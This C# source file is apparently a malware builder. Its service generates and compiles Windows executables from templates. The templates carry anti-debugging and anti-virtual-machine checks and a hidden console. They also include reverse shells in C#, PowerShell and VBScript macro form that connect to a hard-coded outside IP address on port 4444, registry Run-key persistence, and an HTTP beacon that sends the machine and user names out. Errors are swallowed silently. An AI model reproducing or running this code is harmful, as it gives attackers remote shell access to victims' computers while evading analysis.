using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;
using RawrZSecurityPlatform.Models;
using System.Reflection;
using System.Text;

namespace RawrZSecurityPlatform.Services
{
    public class StubGeneratorService : IStubGeneratorService
    {
        private readonly ILogger<StubGeneratorService> _logger;
        private readonly string _stubsPath;
        private readonly string _downloadsPath;

        public StubGeneratorService(ILogger<StubGeneratorService> logger, IWebHostEnvironment environment)
        {
            _logger = logger;
            _stubsPath = Path.Combine(environment.ContentRootPath, "stubs");
            _downloadsPath = Path.Combine(environment.ContentRootPath, "downloads");
            
            Directory.CreateDirectory(_stubsPath);
            Directory.CreateDirectory(_downloadsPath);
        }

        public async Task<StubGenerationResponse> GenerateStubAsync(StubGenerationRequest request)
        {
            try
            {
                _logger.LogInformation($"Generating stub: {request.Type} for {request.Architecture}");

                // Generate C# source code
                var csharpCode = await GenerateCSharpCodeAsync(request);

                // Compile to executable
                var executableBytes = await CompileCSharpToExecutableAsync(csharpCode, request);

                // Save the executable
                var fileName = $"stub_{request.Type}_{request.Architecture}_{DateTime.Now:yyyyMMdd_HHmmss}.exe";
                var filePath = Path.Combine(_downloadsPath, fileName);
                
                await System.IO.File.WriteAllBytesAsync(filePath, executableBytes);

                // Save source code for reference
                var sourceFileName = $"stub_{request.Type}_{request.Architecture}_{DateTime.Now:yyyyMMdd_HHmmss}.cs";
                var sourceFilePath = Path.Combine(_stubsPath, sourceFileName);
                await System.IO.File.WriteAllTextAsync(sourceFilePath, csharpCode);

                return new StubGenerationResponse
                {
                    Success = true,
                    Stub = new StubInfo
                    {
                        Type = request.Type,
                        Architecture = request.Architecture,
                        Size = executableBytes.Length / 1024, // Size in KB
                        Filename = fileName,
                        Path = filePath
                    },
                    DownloadUrl = $"/download/{fileName}"
                };
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error generating stub");
                return new StubGenerationResponse
                {
                    Success = false,
                    Error = ex.Message
                };
            }
        }

        public async Task<string> GenerateCSharpCodeAsync(StubGenerationRequest request)
        {
            var code = new StringBuilder();

            // Add using statements
            code.AppendLine("using System;");
            code.AppendLine("using System.IO;");
            code.AppendLine("using System.Net;");
            code.AppendLine("using System.Net.Sockets;");
            code.AppendLine("using System.Text;");
            code.AppendLine("using System.Threading;");
            code.AppendLine("using System.Diagnostics;");
            code.AppendLine("using System.Runtime.InteropServices;");
            code.AppendLine("using System.Security.Cryptography;");
            code.AppendLine("using System.Management;");
            code.AppendLine("using Microsoft.Win32;");
            code.AppendLine();

            // Add namespace and class
            code.AppendLine("namespace RawrZStub");
            code.AppendLine("{");
            code.AppendLine($"    public class {GetClassName(request.Type)}");
            code.AppendLine("    {");

            // Add anti-analysis methods
            if (request.AntiDebug)
            {
                code.AppendLine(GetAntiDebugCode());
            }

            if (request.AntiVM)
            {
                code.AppendLine(GetAntiVMCode());
            }

            // Add main method based on stub type
            switch (request.Type.ToLower())
            {
                case "exe":
                case "dll":
                case "sys":
                    code.AppendLine(GetExecutableCode(request));
                    break;
                case "ps1":
                case "bat":
                case "cmd":
                    code.AppendLine(GetScriptCode(request));
                    break;
                case "doc":
                case "docx":
                case "xls":
                case "xlsx":
                    code.AppendLine(GetOfficeCode(request));
                    break;
                default:
                    code.AppendLine(GetGenericCode(request));
                    break;
            }

            code.AppendLine("    }");
            code.AppendLine("}");

            return code.ToString();
        }

        public async Task<byte[]> CompileCSharpToExecutableAsync(string csharpCode, StubGenerationRequest request)
        {
            try
            {
                // Parse the C# code
                var syntaxTree = CSharpSyntaxTree.ParseText(csharpCode);

                // Get references
                var references = GetMetadataReferences();

                // Create compilation
                var compilation = CSharpCompilation.Create(
                    $"RawrZStub_{request.Type}_{request.Architecture}",
                    new[] { syntaxTree },
                    references,
                    new CSharpCompilationOptions(OutputKind.ConsoleApplication)
                        .WithOptimizationLevel(OptimizationLevel.Release)
                        .WithPlatform(GetPlatform(request.Architecture))
                );

                // Emit to memory
                using var ms = new MemoryStream();
                var emitResult = compilation.Emit(ms);

                if (!emitResult.Success)
                {
                    var errors = string.Join("\n", emitResult.Diagnostics.Select(d => d.ToString()));
                    throw new Exception($"Compilation failed:\n{errors}");
                }

                return ms.ToArray();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error compiling C# code");
                throw;
            }
        }

        private string GetClassName(string stubType)
        {
            return stubType.ToUpper() switch
            {
                "EXE" => "ExecutableStub",
                "DLL" => "LibraryStub",
                "SYS" => "DriverStub",
                "PS1" => "PowerShellStub",
                "BAT" => "BatchStub",
                "DOC" => "DocumentStub",
                "XLS" => "SpreadsheetStub",
                _ => "GenericStub"
            };
        }

        private string GetAntiDebugCode()
        {
            return @"
        [DllImport(""kernel32.dll"")]
        private static extern bool IsDebuggerPresent();

        [DllImport(""kernel32.dll"")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        private static bool IsBeingDebugged()
        {
            if (IsDebuggerPresent())
                return true;

            bool isRemoteDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isRemoteDebuggerPresent);
            return isRemoteDebuggerPresent;
        }

        private static void AntiDebug()
        {
            if (IsBeingDebugged())
            {
                Environment.Exit(0);
            }
        }
";
        }

        private string GetAntiVMCode()
        {
            return @"
        private static bool IsVirtualMachine()
        {
            try
            {
                // Check for VM artifacts
                var vmArtifacts = new[]
                {
                    ""VMware"", ""VirtualBox"", ""QEMU"", ""Xen"", ""Hyper-V"",
                    ""VBOX"", ""VMXH"", ""VMCI"", ""VMTools"", ""VMMouse""
                };

                foreach (var artifact in vmArtifacts)
                {
                    if (Environment.MachineName.ToUpper().Contains(artifact.ToUpper()) ||
                        Environment.UserName.ToUpper().Contains(artifact.ToUpper()))
                    {
                        return true;
                    }
                }

                // Check registry for VM indicators
                try
                {
                    using (var key = Registry.LocalMachine.OpenSubKey(@""SYSTEM\CurrentControlSet\Services\VBoxService""))
                    {
                        if (key != null) return true;
                    }
                }
                catch { }

                // Check for VM processes
                var vmProcesses = new[] { ""vmtoolsd"", ""vboxservice"", ""vboxtray"", ""vmwaretray"", ""vmwareuser"" };
                foreach (var process in Process.GetProcesses())
                {
                    if (vmProcesses.Any(vm => process.ProcessName.ToLower().Contains(vm)))
                    {
                        return true;
                    }
                }

                return false;
            }
            catch
            {
                return false;
            }
        }

        private static void AntiVM()
        {
            if (IsVirtualMachine())
            {
                Environment.Exit(0);
            }
        }
";
        }

        private string GetExecutableCode(StubGenerationRequest request)
        {
            return @"
        [STAThread]
        public static void Main(string[] args)
        {
            try
            {
                // Anti-analysis checks
                AntiDebug();
                AntiVM();

                // Stealth mode
                if (args.Length > 0 && args[0] == ""--stealth"")
                {
                    // Hide console window
                    ShowWindow(GetConsoleWindow(), 0);
                }

                // Main payload execution
                ExecutePayload();

                // Persistence if requested
                if (args.Length > 1 && args[1] == ""--persist"")
                {
                    InstallPersistence();
                }
            }
            catch (Exception ex)
            {
                // Silent failure
                Environment.Exit(1);
            }
        }

        [DllImport(""kernel32.dll"")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport(""user32.dll"")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static void ExecutePayload()
        {
            // Reverse shell payload
            var host = ""198.199.70.153"";
            var port = 4444;

            try
            {
                using (var client = new TcpClient())
                {
                    client.Connect(host, port);
                    using (var stream = client.GetStream())
                    {
                        var process = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = ""cmd.exe"",
                                Arguments = ""/c"",
                                UseShellExecute = false,
                                RedirectStandardInput = true,
                                RedirectStandardOutput = true,
                                RedirectStandardError = true,
                                CreateNoWindow = true
                            }
                        };

                        process.Start();

                        // Stream handling
                        var inputTask = Task.Run(() =>
                        {
                            var buffer = new byte[1024];
                            while (client.Connected)
                            {
                                var bytesRead = stream.Read(buffer, 0, buffer.Length);
                                if (bytesRead > 0)
                                {
                                    var command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                                    process.StandardInput.WriteLine(command);
                                }
                            }
                        });

                        var outputTask = Task.Run(() =>
                        {
                            while (client.Connected && !process.HasExited)
                            {
                                var output = process.StandardOutput.ReadLine();
                                if (output != null)
                                {
                                    var data = Encoding.UTF8.GetBytes(output + ""\n"");
                                    stream.Write(data, 0, data.Length);
                                }
                            }
                        });

                        Task.WaitAll(inputTask, outputTask);
                    }
                }
            }
            catch
            {
                // Silent failure
            }
        }

        private static void InstallPersistence()
        {
            try
            {
                // Registry persistence
                using (var key = Registry.CurrentUser.OpenSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"", true))
                {
                    key?.SetValue(""RawrZStub"", Process.GetCurrentProcess().MainModule.FileName);
                }
            }
            catch
            {
                // Silent failure
            }
        }
";
        }

        private string GetScriptCode(StubGenerationRequest request)
        {
            return @"
        public static void Main(string[] args)
        {
            // PowerShell/Batch script execution
            var scriptContent = GetScriptContent();
            ExecuteScript(scriptContent);
        }

        private static string GetScriptContent()
        {
            return @""# RawrZ PowerShell Stub
$host = '198.199.70.153'
$port = 4444

try {
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($host, $port)
    $stream = $client.GetStream()
    
    $process = Start-Process -FilePath 'cmd.exe' -ArgumentList '/c' -NoNewWindow -PassThru -RedirectStandardInput -RedirectStandardOutput -RedirectStandardError
    
    # Stream handling
    $inputJob = Start-Job -ScriptBlock {
        param($stream, $process)
        $buffer = New-Object byte[] 1024
        while ($client.Connected) {
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -gt 0) {
                $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
                $process.StandardInput.WriteLine($command)
            }
        }
    } -ArgumentList $stream, $process
    
    $outputJob = Start-Job -ScriptBlock {
        param($stream, $process)
        while ($client.Connected -and -not $process.HasExited) {
            $output = $process.StandardOutput.ReadLine()
            if ($output) {
                $data = [System.Text.Encoding]::UTF8.GetBytes($output + ""`n"")
                $stream.Write($data, 0, $data.Length)
            }
        }
    } -ArgumentList $stream, $process
    
    Wait-Job $inputJob, $outputJob
    Remove-Job $inputJob, $outputJob
} catch {
    # Silent failure
} finally {
    $stream?.Close()
    $client?.Close()
}"";
        }

        private static void ExecuteScript(string scriptContent)
        {
            try
            {
                var tempFile = Path.GetTempFileName() + "".ps1"";
                File.WriteAllText(tempFile, scriptContent);
                
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ""powershell.exe"",
                        Arguments = $""-ExecutionPolicy Bypass -File \""{tempFile}\"""",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                
                process.Start();
                process.WaitForExit();
                
                File.Delete(tempFile);
            }
            catch
            {
                // Silent failure
            }
        }
";
        }

        private string GetOfficeCode(StubGenerationRequest request)
        {
            return @"
        public static void Main(string[] args)
        {
            // Office document macro execution
            ExecuteOfficeMacro();
        }

        private static void ExecuteOfficeMacro()
        {
            try
            {
                // Simulate Office document opening
                var macroCode = GetMacroCode();
                ExecuteVBScript(macroCode);
            }
            catch
            {
                // Silent failure
            }
        }

        private static string GetMacroCode()
        {
            return @""Set objShell = CreateObject(""WScript.Shell"")
Set objFSO = CreateObject(""Scripting.FileSystemObject"")

host = ""198.199.70.153""
port = 4444

On Error Resume Next
Set client = CreateObject(""MSXML2.XMLHTTP"")
client.Open ""GET"", ""http://"" & host & "":"" & port, False
client.Send

' Execute reverse shell
objShell.Run ""cmd.exe /c powershell -Command """"$client = New-Object System.Net.Sockets.TcpClient; $client.Connect('"" & host & ""', "" & port & ""); $stream = $client.GetStream(); $process = Start-Process -FilePath 'cmd.exe' -NoNewWindow -PassThru -RedirectStandardInput -RedirectStandardOutput; $inputJob = Start-Job -ScriptBlock { param($stream, $process) $buffer = New-Object byte[] 1024; while ($client.Connected) { $bytesRead = $stream.Read($buffer, 0, $buffer.Length); if ($bytesRead -gt 0) { $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead); $process.StandardInput.WriteLine($command) } } } -ArgumentList $stream, $process; $outputJob = Start-Job -ScriptBlock { param($stream, $process) while ($client.Connected -and -not $process.HasExited) { $output = $process.StandardOutput.ReadLine(); if ($output) { $data = [System.Text.Encoding]::UTF8.GetBytes($output + ""`n""); $stream.Write($data, 0, $data.Length) } } } -ArgumentList $stream, $process; Wait-Job $inputJob, $outputJob"""""""", 0, True"";
        }

        private static void ExecuteVBScript(string scriptContent)
        {
            try
            {
                var tempFile = Path.GetTempFileName() + "".vbs"";
                File.WriteAllText(tempFile, scriptContent);
                
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = ""cscript.exe"",
                        Arguments = $""//NoLogo \""{tempFile}\"""",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
                
                process.Start();
                process.WaitForExit();
                
                File.Delete(tempFile);
            }
            catch
            {
                // Silent failure
            }
        }
";
        }

        private string GetGenericCode(StubGenerationRequest request)
        {
            return @"
        public static void Main(string[] args)
        {
            // Generic payload execution
            ExecuteGenericPayload();
        }

        private static void ExecuteGenericPayload()
        {
            try
            {
                // Simple HTTP beacon
                var host = ""198.199.70.153"";
                var port = 3000;
                
                using (var client = new WebClient())
                {
                    var url = $""http://{host}:{port}/api/beacon"";
                    var data = $""{{""timestamp"":""{DateTime.UtcNow:O}"",""machine"":""{Environment.MachineName}"",""user"":""{Environment.UserName}""}}"";
                    
                    client.Headers.Add(""Content-Type"", ""application/json"");
                    client.UploadString(url, ""POST"", data);
                }
            }
            catch
            {
                // Silent failure
            }
        }
";
        }

        private List<MetadataReference> GetMetadataReferences()
        {
            var references = new List<MetadataReference>();

            // Add system assemblies
            var assemblies = new[]
            {
                typeof(object).Assembly,
                typeof(Console).Assembly,
                typeof(System.IO.File).Assembly,
                typeof(System.Net.WebClient).Assembly,
                typeof(System.Diagnostics.Process).Assembly,
                typeof(Microsoft.Win32.Registry).Assembly,
                typeof(System.Management.ManagementObject).Assembly
            };

            foreach (var assembly in assemblies)
            {
                references.Add(MetadataReference.CreateFromFile(assembly.Location));
            }

            return references;
        }

        private Platform GetPlatform(string architecture)
        {
            return architecture.ToLower() switch
            {
                "x64" => Platform.X64,
                "x86" => Platform.X86,
                "arm64" => Platform.AnyCpu,
                _ => Platform.AnyCpu
            };
        }
    }
}
